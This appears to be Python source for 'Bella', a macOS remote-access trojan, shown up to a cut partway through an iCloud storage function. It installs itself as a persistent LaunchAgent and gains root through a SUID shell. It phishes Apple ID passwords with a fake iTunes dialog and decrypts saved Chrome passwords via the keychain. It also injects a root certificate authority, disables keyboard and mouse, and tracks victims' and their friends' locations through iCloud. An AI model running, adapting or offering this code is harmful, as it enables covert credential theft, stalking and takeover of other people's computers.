#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, socket, subprocess, time, os, platform, struct, getpass, datetime, plistlib, re, stat, grp, shutil
import string, json, traceback, pwd, urllib, urllib2, base64, binascii, hashlib, sqlite3, bz2, pickle, ast
import StringIO, zipfile, hmac, tempfile, ssl
from xml.etree import ElementTree as ET
from subprocess import Popen, PIPE
from glob import glob
development = True
def create_bella_helpers(launch_agent_name, bella_folder, home_path):
	launch_agent_create = """<?xml version=\"1.0\" encoding=\"UTF-8\"?>
	<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
	<plist version=\"1.0\">
	<dict>
		<key>Label</key>
		<string>%s</string>
		<key>ProgramArguments</key>
		<array>
			<string>%s/Library/%s/Bella</string>
		</array>
		<key>StartInterval</key>
		<integer>5</integer>    
	</dict>
	</plist>\n""" % (launch_agent_name, home_path, bella_folder)
	if not os.path.isdir('%s/Library/LaunchAgents/' % home_path):
		os.makedirs('%s/Library/LaunchAgents/' % home_path)
	with open('%s/Library/LaunchAgents/%s.plist' % (home_path, launch_agent_name), 'wb') as content:
		content.write(launch_agent_create)
	print 'Created Launch Agent'
	print 'Moving Bella'
	if not os.path.isdir('%s/Library/%s/' % (home_path, bella_folder)):
		os.makedirs('%s/Library/%s/' % (home_path, bella_folder))
	if development:
		with open(__file__, 'rb') as content:
			with open('%s/Library/%s/Bella' % (home_path, bella_folder), 'wb') as binary:
				binary.write(content.read())
	else:
		os.rename(__file__, '%s/Library/%s/Bella' % (home_path, bella_folder))
	os.chmod('%s/Library/%s/Bella' % (home_path, bella_folder), 0777)
	print 'Loading Launch Agent'
	out = subprocess.Popen('launchctl load -w %s/Library/LaunchAgents/%s.plist' % (home_path, launch_agent_name), shell=True, stderr=subprocess.PIPE).stderr.read()
	if out == '':
		time.sleep(1)
		ctl_list = subprocess.Popen('launchctl list'.split(), stdout=subprocess.PIPE)
		ctl = ctl_list.stdout.read()
		completed = False
		for agent in ctl.splitlines():
			if launch_agent_name in agent:
				completed = True
		if completed:
			print 'Loaded LaunchAgent'
			print 'BELLA IS NOW RUNNING. CONNECT TO BELLA FROM THE CONTROL CENTER.'
			exit()
		else:
			pass
			print 'Error loading LaunchAgent.'
	elif 'service already loaded' in out:
		print 'Bella is already loaded in LaunchCTL.'
		exit()
	else:
		print out
		pass
	return 

def globber(path): #if we are root, this globber will give us all paths
	if os.getuid() != 0:
		if is_there_SUID_shell():
			(status, msg) = do_root(r"python -c \"from glob import glob; print glob('%s')\"" % path) #special escapes
			if status:
				return ast.literal_eval(msg) #convert string list to list
	return glob(path)

def protected_file_lister(path):
	if os.getuid() != 0:
		if is_there_SUID_shell():
			(status, msg) = do_root(r"python -c \"import os; print os.listdir('%s')\"" % path) #special escapes
			if status:
				return ast.literal_eval(msg)
	return os.listdir(path)

def protected_file_reader(path): #for reading files when we have a backdoor root shell
	if os.getuid() != 0:
		if is_there_SUID_shell():
			(status, msg) = do_root(r"python -c \"g = open('%s'); print g.read(); g.close()\"" % path) #special escapes
			if status:
				return msg[:-2] #this will be a raw representation of the file. knock off last 2 carriage returns
	if os.access(path, os.R_OK):
		with open(path, 'r') as content:
			return content.read()
	return '[%s] is not accessible' % path

def subprocess_manager(pid, path, name): #will keep track of a PID and its path in the global payload_list
	global payload_list
	payload_list.append((pid, path, name)) #path is the binary that we will shutil.rmtree for, and PID we will kill
	return True

def subprocess_cleanup(): #will clean up all of those in the global payload_list
	global payload_list
	for x in payload_list:
		p = kill_pid(x[0])
		#print 'Killed pid [%s]: %s' % (x[0], repr(p))
		payload_cleaner()
		#print 'removed payload [%s]: %s' % (x[1], repr(p))
		if p:
			print 'Killed and cleaned [%s]' % x[2]
			payload_list.remove(x)

def readDB(column, payload=False):
	#we need the path specified below, because we cant read the helper location from DB without knowing what to read 
	conn = sqlite3.connect('%sbella.db' % get_bella_path()) #will create if doesnt exist
	c = conn.cursor()
	if payload:
		c.execute("SELECT %s FROM payloads WHERE id = 1" % column)
	else:
		c.execute("SELECT %s FROM bella WHERE id = %s" % (column, bella_UID))
	try:
		value = c.fetchone()[0]
		if value == None:
			return False
	except TypeError as e:
		return False
	return base64.b64decode(value) #DECODES the data that updatedb ENCODES!

def updateDB(data, column):
	data = base64.b64encode(data) #readDB will return this data DECODED
	if not os.path.isfile("%sbella.db" % get_bella_path()):
		creator = createDB()
		if not creator[0]:
			return (False, "Error creating database! [%s]" % creator[1])
	conn = sqlite3.connect('%sbella.db' % get_bella_path()) #will create if doesnt exist
	c = conn.cursor()
	c.execute("SELECT * FROM bella WHERE id = %s" % bella_UID)
	if len(c.fetchall()) == 0: #then that user is not yet in our DB, so let's create them
		c.execute("INSERT INTO bella (id, username) VALUES (%s, '%s')" % (bella_UID, get_bella_user()))
	c.execute("UPDATE bella set %s = '%s' WHERE id = %s" % (column, data, bella_UID))
	conn.commit()
	conn.close()
	return (True, '')

def check_if_payloads():
	conn = sqlite3.connect('%sbella.db' % get_bella_path()) #will create if doesnt exist
	c = conn.cursor()
	c.execute("SELECT * FROM payloads WHERE id = 1")
	if len(c.fetchall()) == 0: #then that user is not yet in our DB, so let's create them
		return False
	return True

def inject_payloads(payload_encoded):
	conn = sqlite3.connect('%sbella.db' % get_bella_path()) #will create if doesnt exist
	c = conn.cursor()
	try:
		(vncFile, kcFile, mcFile, rsFile, insomniaFile, lockFile, chainbreakerFile) = payload_encoded.splitlines()
		c.execute("INSERT INTO payloads (id, vnc, keychaindump, microphone, root_shell, insomnia, lock_icon, chainbreaker) VALUES (1, '%s', '%s', '%s', '%s', '%s', '%s', '%s')" % (vncFile.encode('base64'), kcFile.encode('base64'), mcFile.encode('base64'), rsFile.encode('base64'), insomniaFile.encode('base64'), lockFile.encode('base64'), chainbreakerFile.encode('base64')))
		conn.commit()
		conn.close()
		return True
	except Exception as e:
		print e
		conn.close()
		return False

def createDB():
	try:
		conn = sqlite3.connect('%sbella.db' % get_bella_path()) #will create if doesnt exist
		c = conn.cursor()
		c.execute("CREATE TABLE bella (id int, username text, lastLogin text, model text, mme_token text, applePass text, localPass text, chromeSS text, text)")
		c.execute("CREATE TABLE payloads(id int, vnc text, keychaindump text, microphone text, root_shell text, insomnia text, lock_icon text, chainbreaker text)")
		conn.commit()
		conn.close()
		print "Created Bella DB"
	except sqlite3.OperationalError as e:
		if e[0] == "table bella already exists":
			return (True, e)
		else:
			return (False, e) #some error
	return (True, None)

def encrypt(data):
	#This function will encode any given data into base64. It will then pass this encoded data as
	#a command line argument, into the openssl binary, where it will be encrypted with aes-128-cbc
	#using the master key specified at the top of the program. We encode the data so there are no unicode issues
	#the openssl binary will then return ANOTHER DIFFERENT base64 string, that is the ENCODED ENCRYPTED data
	#this ENCODED ENCRYPTED DATA [of ENCODED RAW DATA] can be decrypted by the decrypt function, which expects a 
	#base64 input and outputs the original raw data in an encoded format. this encoded format is then decoded and returned to 
	#the subroutine that called the function.
	data = base64.b64encode(data) 
	encrypted = subprocess.check_output("openssl enc -base64 -e -aes-128-cbc -k %s <<< '%s'" % (cryptKey, data), shell=True) #encrypt password
	return encrypted

def decrypt(data):
	#data = base64.b64decode(data)
	decrypted = subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -k %s <<< '%s'" % (cryptKey, data), shell=True) #encrypt password
	return base64.b64decode(decrypted)

def main_iCloud_helper():
	error, errorMessage = False, False
	dsid, token = "", ""
	(username, password, usingToken) = iCloud_auth_process(False)
	error = False
	if password == False:
		errorMessage = "%s%s" % (red_minus, username) #username will have the error message
		error = True
	else:
		content = dsid_factory(username, password)
		if content[0] == False:
			errorMessage =content[1]
			error = True
		else:
			try:
				(dsid, token, usingToken) = content
			except ValueError, e:
				errorMessage = '\n'.join(content)
				error = True
	return (error, errorMessage, dsid, token)

def byte_convert(byte):
	for count in ['B','K','M','G']:
		if byte < 1024.0:
			return ("%3.1f%s" % (byte, count)).replace('.0', '')
		byte /= 1024.0
	return "%3.1f%s" % (byte, 'TB')

def cur_GUI_user():
	try:
		return subprocess.check_output("stat -f '%Su' /dev/console", shell=True).replace("\n", "")
	except:
		return "No Current GUI"

def check_output(cmd):
	process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	stderr = process.stderr.read()
	stdout = process.stdout.read()
	if process.wait() != 0:
		print stderr
		return (False, stderr, process.wait()) #failed, stderr, exit code
	return (True, stdout, process.wait()) #completed successfully, stdout, exit code

def appleIDPhishHelp():
	returnString = ""
	for x in get_iTunes_accounts():
		if x[0]:
			returnString += "Local user: [%s] Apple ID: [%s]\n" % (x[2], x[1])
		else:
			pass
	return pickle.dumps((returnString, cur_GUI_user()))

def appleIDPhish(username, GUIUser):
	global bellaConnection
	while True:
		### CTRLC listener
		bellaConnection.settimeout(0.0) 
		try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
			if recv_msg(bellaConnection) == 'sigint9kill':
				sys.stdout.flush()
				send_msg('terminated', True) #send back confirmation along with STDERR
				done = True
				bellaConnection.settimeout(None)
				return 1
		except socket.error as e: #no message, business as usual
			pass
		bellaConnection.settimeout(None)

		check = applepwRead()
		if isinstance(check, str): #we have file...
			send_msg("%sApple password already found [%s] %s\n" % (blue_star, check, blue_star), False)
			break
		osa = "launchctl asuser " + str(bella_UID) + " osascript -e 'tell application \"iTunes\"' -e \"pause\" -e \"end tell\"; osascript -e 'tell app \"iTunes\" to activate' -e 'tell app \"iTunes\" to activate' -e 'tell app \"iTunes\" to display dialog \"Error connecting to iTunes. Please verify your password for " + username + " \" default answer \"\" with icon 1 with hidden answer with title \"iTunes Connection\"'"
		#pauses music, then prompts user
		out = check_output(osa)
		if not out[0]:
			#user has attempted to cancel
			send_msg("[-] User has attempted to cancel. Trying again.\n", False)
			continue
		else:
			out = out[1]
			passw = out.split()[3]
			passw = passw.split(':')[1]
			send_msg("%sUser has attempted to use password: %s\n" % (blue_star, passw), False)
			try:
				request = urllib2.Request("https://setup.icloud.com/setup/get_account_settings")
				base64string = base64.encodestring('%s:%s' % (username, passw)).replace('\n', '')
				request.add_header("Authorization", "Basic %s" % base64string)   
				result = urllib2.urlopen(request)
				out2 = result.read()
			except Exception, e:
				if str(e) == "HTTP Error 401: Unauthorized":
					out2 = "fail?"
				elif str(e) == "HTTP Error 409: Conflict":
					out2 = "2sV"
				else:
					out2 = "otherError!"

			if out2 == "fail?":
				send_msg(red_minus + "Bad combo: [%s:%s]\n" % (username, passw), False)
				continue
			elif out2 == "2sV":
				send_msg("%sVerified! [2FV Enabled] Account -> [%s:%s]%s\n" % (greenPlus, username, passw, endANSI), False)
				updateDB(encrypt("%s:%s" % (username, passw)), 'applePass')
				os.system("osascript -e 'tell application \"iTunes\"' -e \"play\" -e \"end tell\";")
				break
			elif out2 == "otherError!":
				send_msg("%sMysterious error with [%s:%s]\n" % (red_minus, username, passw), False)
				break
			else:
				send_msg("%sVerified! Account -> %s[%s:%s]%s\n" % (greenPlus, bold, username, passw, endANSI), False)
				updateDB(encrypt("%s:%s" % (username, passw)), 'applePass')
				os.system("osascript -e 'tell application \"iTunes\"' -e \"play\" -e \"end tell\";")
				break
	send_msg('', True)
	return 1

def is_there_SUID_shell():
	if os.getuid() == 0:
		return True

	if os.path.isfile('/usr/local/roots'):
		return True

	if local_pw_read():
		#send_msg("%sLocal PW present.\n" % greenPlus, False)
		binarymake = make_SUID_root_binary(local_pw_read(), None)
		#send_msg(binarymake[1], False)
		if binarymake[0]: #we have successfully created a temp root shell
			return True 
		return False

	return False

def remove_SUID_shell():
	if os.path.isfile('/usr/local/roots'):
		try:
			os.system('/usr/local/roots rm /usr/local/roots > /dev/null')
			#send_msg('%sRemoved temporary root shell.\n' % yellow_star, False) #%
		except Exception as e:
			pass
			#send_msg('%sError removing temporary root shell @ /usr/local/roots. You should delete this manually.\n' % red_minus , False)
	return

def do_root(command):
	if os.getuid() == 0:
		output = subprocess.Popen("%s" % command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		out = output.stdout.read()
		err = output.stderr.read()
		if output.wait() != 0:
			return (False, '%sWe are root, but there was an error.\n%s%s' % (blue_star, yellow_star, err))
		return (True, "%s\n" % out)
	else:
		if not is_there_SUID_shell():
			return (False, '%sThere is no root shell to perform this command. See [rooter] manual entry.\n' % red_minus)
		output = subprocess.Popen("/usr/local/roots \"%s\"" % (command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		out = output.stdout.read()
		err = output.stderr.read()
		if err != '':
			return (False, '%sThere is a root shell to perform this command, but there was an error.\n%s%s' % (blue_star, yellow_star, err))
		return (True, "%s\n" % out)

def cert_inject(cert):
	cPath = tempfile.mkdtemp()
	with open('%scert.crt' % cPath, 'w') as content:
		content.write(cert)
	temp_file_list.append(cPath)
	(success, msg) = do_root("security add-trusted-cert -d -r trustRoot -k /System/Library/Keychains/SystemRootCertificates.keychain %scert.crt" % cPath)
	if not success:
		return "%sError injecting root CA into System Keychain:\n%s" % (red_minus, msg)
	payload_cleaner()
	return "%sCertificate Authority injected into System Keychain!\n" % yellow_star

def cert_remove(shahash):
	(success, msg) = do_root("security delete-certificate -Z %s /System/Library/Keychains/SystemRootCertificates.keychain" % shahash)
	if not success:
		return "%sError removing root CA from System Keychain:\n%s" % (red_minus, msg)
	return "%sCertificate Authority removed from System Keychain!\n" % yellow_star

def check_current_users():
	output = check_output("w -h | sort -u -t' ' -k1,1 | awk {'print $1'}")
	if not output[0]:
		return "Error finding current users.\n"
	return output[1]

def check_pid(pid):        
	try:
		os.kill(pid, 0)
	except OSError:
		return False
	else:
		return True

def chrome_decrypt(encrypted_value, iv, key): #AES decryption using the PBKDF2 key and 16x ' ' IV, via openSSL (installed on OSX natively)
	hexKey = binascii.hexlify(key)
	hexEncPassword = base64.b64encode(encrypted_value[3:])
	decrypted = check_output("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null" % (iv, hexKey, hexEncPassword))
	if not decrypted[0]:
		decrypted = "ERROR retrieving password.\n"
	return decrypted[1] #otherwise we got it

def chrome_dump(safe_storage_key, loginData):
	returnable = "%s%sPasswords for [%s]%s:\n" % (yellow_star, bold + underline, loginData.split("/")[-2], endANSI)
	empty = True
	for i, x in enumerate(chrome_process(safe_storage_key, "%s" % loginData)):
		returnable += "%s[%s]%s %s%s%s\n\t%sUser%s: %s\n\t%sPass%s: %s\n" % ("\033[32m", (i + 1), "\033[0m", "\033[1m", x[0], "\033[0m", "\033[32m", "\033[0m", x[1], "\033[32m", "\033[0m", x[2])
		empty = False
	if not empty:
		return returnable
	else:
		return "%sFound no Chrome Passwords for [%s].\n" % (blue_star, loginData.split("/")[-2])

def chrome_process(safe_storage_key, loginData):
	iv = ''.join(('20',) * 16) #salt, iterations, iv, size - https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm
	key = hashlib.pbkdf2_hmac('sha1', safe_storage_key, b'saltysalt', 1003)[:16]
	copypath = tempfile.mkdtemp() #work around for locking DB
	dbcopy = protected_file_reader(loginData) #again, shouldnt matter because we only can decrypt DBs with keys
	with open('%s/chrome' % copypath, 'wb') as content:
		content.write(dbcopy) #if chrome is open, the DB will be locked, so get around by making a temp copy
	database = sqlite3.connect('%s/chrome' % copypath)
	sql = 'select username_value, password_value, origin_url from logins'
	decryptedList = []
	with database:
		for user, encryptedPass, url in database.execute(sql):
			if user == "" or (encryptedPass[:3] != b'v10'): #user will be empty if they have selected "never" store password
				continue
			else:
				urlUserPassDecrypted = (url.encode('ascii', 'ignore'), user.encode('ascii', 'ignore'), chrome_decrypt(encryptedPass, iv, key=key).encode('ascii', 'ignore'))
				decryptedList.append(urlUserPassDecrypted)
	shutil.rmtree(copypath)
	return decryptedList

def chrome_safe_storage():
	global bellaConnection
	retString = ""
	check = chromeSSRead()
	if isinstance(check, str):
		send_msg("%sPreviously generated Google Chrome Safe Storage key.\n%s%s\n" % (blue_star, blue_star, check), True)
		return
	while True:
		### CTRLC listener
		bellaConnection.settimeout(0.0) 
		try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
			if recv_msg(bellaConnection) == 'sigint9kill':
				sys.stdout.flush()
				send_msg('terminated', True) #send back confirmation along with STDERR
				done = True
				bellaConnection.settimeout(None)
				return 1
		except socket.error as e: #no message, business as usual
			pass
		bellaConnection.settimeout(None)
		kchain = getKeychains()
		send_msg("%sUsing [%s] as keychain.\n" % (yellow_star, kchain), False)
		
		encryptionKey = check_output("launchctl asuser %s security find-generic-password -wa 'Chrome' '%s'" % (bella_UID, kchain)) #get rid of \n
		if not encryptionKey[0]:
			if 51 == encryptionKey[2]:
				send_msg("%sUser clicked deny.\n" % red_minus, False)
				continue
			elif 44 == encryptionKey[2]:
				send_msg("%sNo Chrome Safe Storage Key Found!\n" % red_minus, True)
				return
			else:
				send_msg("Strange error [%s]\n" % encryptionKey[1], True)
				return
		updateDB(encrypt(encryptionKey[1].replace('\n', '')), 'chromeSS') #got it
		send_msg("%sChrome Key: [%s]\n" % (blue_star, encryptionKey[1].replace('\n', '')), True)
		return

def disable_keyboard_mouse(device):
	paths = {"keyboard": "/System/Library/Extensions/AppleUSBTopCase.kext/Contents/PlugIns/AppleUSBTCKeyboard.kext/", "mouse": "/System/Library/Extensions/AppleUSBMultitouch.kext/"}
	(success, msg) = do_root("kextunload %s" % paths[device])
	if not success:
		return "%sError disabling %s.\n%s" % (red_minus, paths[device], msg)
	return "%s%s successfully disabled!\n" % (greenPlus, device)

def dsid_factory(uname, passwd):
	resp = None
	req = urllib2.Request("https://setup.icloud.com/setup/authenticate/%s" % uname)
	req.add_header('Authorization', 'Basic %s' % base64.b64encode("%s:%s" % (uname, passwd)))
	req.add_header('Content-Type', 'application/json')
	try:
		resp = urllib2.urlopen(req)
	except urllib2.HTTPError as e:
		if e.code != 200:
			if e.code == 401:
				return (False, "HTTP Error 401: Unauthorized. Are you sure the credentials are correct?\n", False)
			elif e.code == 409:
				tokenLocal = tokenRead()
				if tokenLocal != False: #if we have token use it ... bc 2SV wont work with regular uname/passw                    
					dsid = tokenLocal.split("\n")[1].split(":")[0]
					tokz = tokenLocal.split("\n")[1].split(":")[1]
					return (dsid, tokz, True)
				else:
					return (False, "HTTP Error 409: Conflict. 2 Factor Authentication appears to be enabled. You cannot use this function unless you get your MMeAuthToken manually (generated either on your PC/Mac or on your iOS device).\n", False)
			elif e.code == 404:
				return (False, "HTTP Error 404: URL not found. Did you enter a username?\n", False)
			else:
				return (False, "HTTP Error %s." % e.code, False)
		else:
			return e
	content = resp.read()
	uname = plistlib.readPlistFromString(content)["appleAccountInfo"]["dsPrsID"] #stitch our own auth DSID
	passwd = plistlib.readPlistFromString(content)["tokens"]["mmeAuthToken"] #stitch with token
	return (uname, passwd, False) #third value is "usingToken?"

def enable_keyboard_mouse(device):
	paths = {"keyboard": "/System/Library/Extensions/AppleUSBTopCase.kext/Contents/PlugIns/AppleUSBTCKeyboard.kext/", "mouse": "/System/Library/Extensions/AppleUSBMultitouch.kext/"}
	(success, msg) = do_root("kextload %s" % paths[device])
	if not success:
		return "%sError enabling %s.\n%s" % (red_minus, paths[device], msg)
	return "%s%s successfully enabled!\n" % (greenPlus, device)

def enumerate_chrome_profiles():
	return globber("/Users/*/Library/Application Support/Google/Chrome/*/Login Data") 

def FMIP(username, password):
	i = 0
	try: #if we are given a FMIP token, change auth Type 
		int(username)
		authType = "Forever"
	except ValueError: #else apple id use useridguest
		authType = "UserIDGuest" 
	while True:
		i +=1
		url = 'https://fmipmobile.icloud.com/fmipservice/device/%s/initClient' % username
		headers = {
			'X-Apple-Realm-Support': '1.0',
			'Authorization': 'Basic %s' % base64.b64encode("%s:%s" % (username, password)),
			'X-Apple-Find-API-Ver': '3.0',
			'X-Apple-AuthScheme': '%s' % authType,
			'User-Agent': 'FindMyiPhone/500 CFNetwork/758.4.3 Darwin/15.5.0',
		}
		request = urllib2.Request(url, None, headers)
		request.get_method = lambda: "POST"
		try:
			response = urllib2.urlopen(request)
			z = json.loads(response.read())
		except urllib2.HTTPError as e:
			if e.code == 401:
				return "Authorization Error 401. Try credentials again."
			if e.code == 403:
				pass #can ignore
			raise e
		if i == 2: #loop twice / send request twice
			break
		send_msg("Sent \033[92mlocation\033[0m beacon to \033[91m[%s]\033[0m devices\n" % len(z["content"]), False)
		send_msg("Awaiting response from iCloud...\n", False)
		#okay, FMD request has been sent, now lets wait a bit for iCloud to get results, and then do again, and then break
		time.sleep(5)
	send_msg("\033[94m(%s %s | %s)\033[0m -> \033[92mFound %s Devices\033[0m\n-------\n" % (z["userInfo"]["firstName"], z["userInfo"]["lastName"], username, len(z["content"])), False)
	i = 1
	for y in z["content"]:
		try:
			send_msg("Device [%s]\n" % i, False)
			i += 1
			send_msg("Model: %s\n" % y["deviceDisplayName"], False)
			send_msg("Name: %s\n" % y["name"], False)
			timeStamp = y["location"]["timeStamp"] / 1000
			timeNow = time.time()
			timeDelta = timeNow - timeStamp #time difference in seconds
			minutes, seconds = divmod(timeDelta, 60) #great function, saves annoying maths
			hours, minutes = divmod(minutes, 60)
			timeStamp = datetime.datetime.fromtimestamp(timeStamp).strftime("%A, %B %d at %I:%M:%S")
			if hours > 0:
				timeStamp = "%s (%sh %sm %ss ago)" % (timeStamp, str(hours).split(".")[0], str(minutes).split(".")[0], str(seconds).split(".")[0])
			else:
				timeStamp = "%s (%sm %ss ago)" % (timeStamp, str(minutes).split(".")[0], str(seconds).split(".")[0])
			send_msg("Latitude, Longitude: <%s;%s>\n" % (y["location"]["latitude"], y["location"]["longitude"]), False)
			send_msg("Battery: %s & %s\n" % (y["batteryLevel"], y["batteryStatus"]), False)
			send_msg("\033[92mLocated at: %s\033[0m\n" % timeStamp, False)
			send_msg("-------\n", False)
		except TypeError,e :
			send_msg("\033[92mCould not get GPS lock!\033[0m\n", False)
	send_msg('', True)
	return 0

def get_card_links(dsid, token):
	url = 'https://p04-contacts.icloud.com/%s/carddavhome/card' % dsid
	headers = {
		'Depth': '1',
		'Authorization': 'X-MobileMe-AuthToken %s' % base64.b64encode("%s:%s" % (dsid, token)),
		'Content-Type': 'text/xml',
	}
	data = """<?xml version="1.0" encoding="UTF-8"?>
	<A:propfind xmlns:A="DAV:">
	  <A:prop>
		<A:getetag/>
	  </A:prop>
	</A:propfind>
	"""
	request = urllib2.Request(url, data, headers)
	request.get_method = lambda: 'PROPFIND' #replace the get_method fxn from its default to PROPFIND to allow for successfull cardDav pull
	response = urllib2.urlopen(request)
	zebra = ET.fromstring(response.read())
	returnedData = """<?xml version="1.0" encoding="UTF-8"?>
	<F:addressbook-multiget xmlns:F="urn:ietf:params:xml:ns:carddav">
	  <A:prop xmlns:A="DAV:">
		<A:getetag/>
		<F:address-data/>
	  </A:prop>\n"""
	for response in zebra:
		for link in response:
			href = response.find('{DAV:}href').text #get each link in the tree
		returnedData += "<A:href xmlns:A=\"DAV:\">%s</A:href>\n" % href
	return "%s</F:addressbook-multiget>" % str(returnedData)

def get_card_data(dsid, token):
	url = 'https://p04-contacts.icloud.com/%s/carddavhome/card' % dsid
	headers = {
		'Content-Type': 'text/xml',
		'Authorization': 'X-MobileMe-AuthToken %s' % base64.b64encode("%s:%s" % (dsid, token)),
	}
	data = get_card_links(dsid, token)
	request = urllib2.Request(url, data, headers)
	request.get_method = lambda: 'REPORT' #replace the get_method fxn from its default to REPORT to allow for successfull cardDav pull
	response = urllib2.urlopen(request)
	zebra = ET.fromstring(response.read())
	i = 0
	contactList, phoneList, cards = [], [], []
	for response in zebra:
		tel, contact, email = [], [], []
		name = ""
		vcard = response.find('{DAV:}propstat').find('{DAV:}prop').find('{urn:ietf:params:xml:ns:carddav}address-data').text
		if vcard:
			for y in vcard.splitlines():
				if y.startswith("FN:"):
					name = y[3:]
				if y.startswith("TEL;"):
					tel.append((y.split("type")[-1].split(":")[-1].replace("(", "").replace(")", "").replace(" ", "").replace("-", "").encode("ascii", "ignore")))
				if y.startswith("EMAIL;") or y.startswith("item1.EMAIL;"):
					email.append(y.split(":")[-1])
			cards.append(([name], tel, email))
	return sorted(cards)

def get_iTunes_accounts():
	iClouds = globber("/Users/%s/Library/Accounts/Accounts3.sqlite" % get_bella_user()) #we are only interested in the current GUI user
	returnList = []
	for x in iClouds:
		database = sqlite3.connect(x)
		try:
			accounts = list(database.execute("SELECT ZUSERNAME FROM ZACCOUNT WHERE ZACCOUNTDESCRIPTION='iCloud'"))
			username = accounts[0][0] #gets just the first account, no multiuser support yet
			returnList.append((True, username, x.split("/")[2]))
		except Exception, e:
			if str(e) == "list index out of range":
				returnList.append((False, "No iCloud Accounts present\n", x.split("/")[2]))
			else:
				returnList.append((False, "%s\n" % str(e), x.split("/")[2]))
	return returnList

def get_model():
	model = readDB('model')
	if not model:
		return model
	return model

def heard_it_from_a_friend_who(uDsid, mmeAuthToken, cardData):
	mmeFMFAppToken = tokenFactory(base64.b64encode("%s:%s" % (uDsid, mmeAuthToken)))[0][2]
	url = 'https://p04-fmfmobile.icloud.com/fmipservice/friends/%s/refreshClient' % uDsid
	headers = {
		'Authorization': 'Basic %s' % base64.b64encode("%s:%s" % (uDsid, mmeFMFAppToken)),#FMF APP TOKEN
		'Content-Type': 'application/json; charset=utf-8',
	}
	data = {
		"clientContext": {
			"appVersion": "5.0" #critical for getting appropriate config / time apparently.
		}
	}
	jsonData = json.dumps(data)
	request = urllib2.Request(url, jsonData, headers)
	i = 0
	while 1:
		try:
			response = urllib2.urlopen(request)
			break
		except: #for some reason this exception needs to be caught a bunch of times before the request is made.
			i +=1
			continue
	x = json.loads(response.read())
	dsidList = []
	phoneList = [] #need to find how to get corresponding name from CalDav
	for y in x["following"]: #we need to get contact information.
		for z, v in y.items():
			#do some cleanup
			if z == "invitationAcceptedHandles":
				v = v[0] #v is a list of contact information, we will grab just the first identifier
				phoneList.append(v)
			if z == "id":
				v = v.replace("~", "=")
				v = base64.b64decode(v)
				dsidList.append(v)
	zippedList = zip(dsidList, phoneList)
	retString = ""
	i = 0
	for y in x["locations"]:#[0]["location"]["address"]:
		streetAddress, country, state, town, timeStamp = " " *5
		dsid = y["id"].replace("~", "=")
		dsid = base64.b64decode(dsid) #decode the base64 id, and find its corresponding one in the zippedList.
		for g in zippedList:
			if g[0] == dsid:
				phoneNumber = g[1] #we should get this for every person. no errors if no phone number found. 
				for x in cardData:
					for nums in x[1]:
						if phoneNumber.replace("+1", "") in nums:
							phoneNumber += " (%s)" % x[0][0]
					for emails in x[2]:
						if phoneNumber in emails:
							phoneNumber += " (%s)" % x[0][0]
		try:
			timeStamp = y["location"]["timestamp"] / 1000
			timeNow = time.time()
			timeDelta = timeNow - timeStamp #time difference in seconds
			minutes, seconds = divmod(timeDelta, 60) #great function, saves annoying maths
			hours, minutes = divmod(minutes, 60)
			timeStamp = datetime.datetime.fromtimestamp(timeStamp).strftime("%A, %B %d at %I:%M:%S")
			timeStamp = "%s (%sm %ss ago)" % (timeStamp, str(minutes).split(".")[0], str(seconds).split(".")[0]) #split at decimal
		except TypeError:
			timeStamp = "Could not get last location time."

		if not y["location"]: #once satisfied, all is good, return fxn will end
			continue #go back to top of loop and re-run query
		
		for z, v in y["location"]["address"].items(): #loop through address info
			#counter of threes for pretty print...
			if type(v) is list:
				continue
			if z == "streetAddress":
				streetAddress = v
			if z == "countryCode":
				country = v
			if z == "stateCode":
				state = v
			if z == "locality":
				town = v

		if streetAddress != " ": #in the event that we cant get a street address, dont print it to the final thing
			retString += "%s\n%s\n%s, %s, %s\n%s\n%s\n" % ("\033[34m" + phoneNumber, "\033[92m" + streetAddress, town, state, country, "\033[0m" + timeStamp,"-----")
		else:
			retString += "%s\n%s, %s, %s\n%s\n%s\n" % ("\033[34m" + phoneNumber, "\033[92m" + town, state, country, "\033[0m" + timeStamp,"-----")

		i += 1
	localToken = tokenRead()
	if tokenRead() != False:
		uDsid = tokenRead().split("\n")[0]
	return retString + "\033[91mFound \033[93m[%s]\033[91m friends for %s!\033[0m\n" % (i, uDsid)

def iCloud_auth_process(tokenOverride):
	#this function will return a username and password combination, or a DSID and token combination, along with a code for which one is being used.
	returnString = ""
	token = ""
	usingToken = False
	localToken = tokenRead()

	applePresent = applepwRead()

	if isinstance(applePresent, str) and tokenOverride == False:
		(username, password) = applepwRead().split(":") #just take the first account if there are multiple
		usingToken = False

	elif localToken != False: #means we have a token file.
			try:
				(username, password) = localToken.split("\n")[1].split(":")
				usingToken = True
			except Exception, e:
				return (e, False, usingToken)
	else: #means we have neither a token file, or apple creds
		return ("No token found, no apple credentials found.\n", False, usingToken)
	
	return (username, password, usingToken)

def iCloud_storage_helper(dsid, authToken):
	authCode = base64.b64encode("%s:%s" % (dsid, authToken))
	tokens = tokenFactory(authCode)
	send_msg('Getting iCloud information.\n', False)
	try:
		req = urllib2.Request("https://p04-quota.icloud.com/quotaservice/external/mac/%s/storageUsageDetails" % dsid) #this will have all tokens
		req.add_header('Authorization', 'Basic %s' % authCode)
		req.add_header('Content-Type', 'application/json')
		resp = urllib2.urlopen(req)
		storageData = resp.read()
	except Exception as e:
		send_msg("Slight error [%s]" % e, False)
	resp_dict = json.loads(storageData)

	for x in tokens[1]: #tokens[1] is the account information of the user
		send_msg("%s\n\n" % x, False)

	try:
		for x in resp_dict["photo"]:
			if x["libraryEnabled"]:
				send_msg(underline + "iCloud Photo Library: Enabled" + endANSI + "\n", False)
				send_msg("\tPhoto Count: %s\n" % x["photoCount"], False)
				send_msg("\tVideo Count: %s\n" % x["videoCount"], False)
				send_msg("\tiCloud Photo Library Size: %s.%s GB\n" % (str(x["storageUsedInBytes"])[0], str(x["storageUsedInBytes"])[1:4]), False)
			else:
